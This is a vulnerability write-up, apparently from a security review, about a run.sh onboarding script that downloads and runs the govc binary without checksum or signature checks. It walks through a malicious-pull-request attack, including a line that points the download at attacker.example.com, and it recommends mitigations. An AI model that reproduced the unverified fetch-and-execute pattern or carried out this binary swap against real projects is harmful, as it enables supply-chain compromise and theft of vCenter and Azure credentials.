### Vulnerability List

- Vulnerability Name: Malicious govc Binary Download via PR Modification
- Description:
    1. A malicious actor submits a pull request to modify the `/code/src/appliance-onboarding-script/run.sh` script.
    2. In the pull request, the attacker changes the `URL_TO_BINARY` variable on line 86 from `https://github.com/vmware/govmomi/releases/download/v0.24.0/govc_linux_amd64.gz` to a URL pointing to a malicious `govc_linux_amd64.gz` binary hosted on an attacker-controlled server or a compromised legitimate server.
    3. If the pull request is merged or if a user executes the modified script from the attacker's branch, the script will download the malicious `govc` binary instead of the legitimate one.
    4. The script proceeds to extract the downloaded archive and make the binary executable using `chmod +x`.
    5. Subsequently, when other parts of the scripts or related components attempt to use `govc`, they will be executing the malicious binary.
- Impact:
    - Execution of arbitrary code on the system where the script is run with the permissions of the script execution context (potentially elevated if `sudo` is used later with the compromised `govc`).
    - Potential compromise of the vCenter environment if the malicious `govc` binary is designed to interact with vCenter in a harmful way using the provided credentials or if it exfiltrates vCenter credentials.
    - Potential compromise of Azure resources if the malicious binary gains access to Azure credentials or is designed to interact with Azure services maliciously.
    - Data breach or disruption of service depending on the payload of the malicious `govc` binary.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    - None. The script downloads and executes the binary directly without any integrity checks.
- Missing Mitigations:
    - **Integrity Checks:** Implement integrity checks for downloaded binaries. This could involve:
        - **Checksum Verification:** Download a checksum file (e.g., SHA256) from a trusted source alongside the binary and verify the checksum of the downloaded binary before execution.
        - **Signature Verification:** Verify a digital signature of the binary using a public key from a trusted source.
    - **Secure Binary Hosting:** Host the `govc` binary (and potentially Azure CLI install script) in a controlled and trusted location, such as Azure Blob Storage with restricted access and integrity protection, instead of relying on external public repositories like GitHub releases.
    - **Dependency Pinning/Vendoring:** Consider including the `govc` binary directly in the repository or using a secure distribution mechanism (like a private package registry) to avoid runtime downloads and ensure a known good version is used. If downloading at runtime is necessary, pin the version explicitly and strictly validate the download source and integrity.
- Preconditions:
    - The attacker must be able to submit a pull request and convince a maintainer to merge it, or be able to execute the script from their own modified branch.
    - The script must be executed in an environment that has internet access to download the binary and permissions to execute it.
- Source Code Analysis:
    - File: `/code/src/appliance-onboarding-script/run.sh`
    - Line 86: `URL_TO_BINARY="https://github.com/vmware/govmomi/releases/download/v0.24.0/govc_linux_amd64.gz"` - Defines the download URL for the `govc` binary. This URL is hardcoded and can be changed via a pull request.
    - Line 88: `curl -L $URL_TO_BINARY | gunzip > ./.temp/govc` - Downloads the binary from the URL defined in `URL_TO_BINARY` using `curl` and extracts it using `gunzip`. The `-L` option for `curl` follows redirects, which could be a concern if the attacker can redirect the download to a malicious site.
    - Line 89: `sudo -E chmod +x ./.temp/govc` - Sets execute permissions on the downloaded binary, making it runnable.
- Security Test Case:
    1. **Setup Attacker Environment:** Prepare a malicious `govc_linux_amd64.gz` binary. This could be a simple script that prints a message to `stdout` and exits for a safe test, or a more sophisticated payload for a real exploit scenario. Host this malicious binary on an attacker-controlled web server accessible via `https://attacker.example.com/malicious-govc_linux_amd64.gz`.
    2. **Fork Repository:** Fork the target GitHub repository.
    3. **Modify `run.sh` in Fork:** In your forked repository, edit the file `/code/src/appliance-onboarding-script/run.sh`.
    4. **Change `URL_TO_BINARY`:** On line 86, replace the original URL with the URL of your malicious binary:
       ```bash
       URL_TO_BINARY="https://attacker.example.com/malicious-govc_linux_amd64.gz"
       ```
    5. **Create Pull Request (Optional for direct testing):** Create a pull request from your fork to the original repository with this change. For direct testing, you can skip the pull request and directly use your fork.
    6. **Execute Modified Script:** In a test environment (e.g., a virtual machine or a controlled Azure environment), clone your forked repository or checkout the branch with the modified `run.sh`.
    7. **Run `run.sh`:** Execute the modified `run.sh` script: `bash run.sh <operation> <config_file_path>`. Provide valid arguments for `<operation>` and `<config_file_path>` to allow the script to proceed to the binary download section.
    8. **Observe Execution:** Observe the output of the script. If the test malicious binary is simple (e.g., prints a message), you should see that message in the script's output, indicating that your malicious binary was downloaded and executed. For a real exploit, the actions defined in the malicious `govc` binary would be executed.
    9. **Verify Vulnerability:** If the malicious code from your binary is executed, the vulnerability is confirmed.

This is a valid vulnerability that can be exploited through a malicious pull request, leading to potential system compromise.
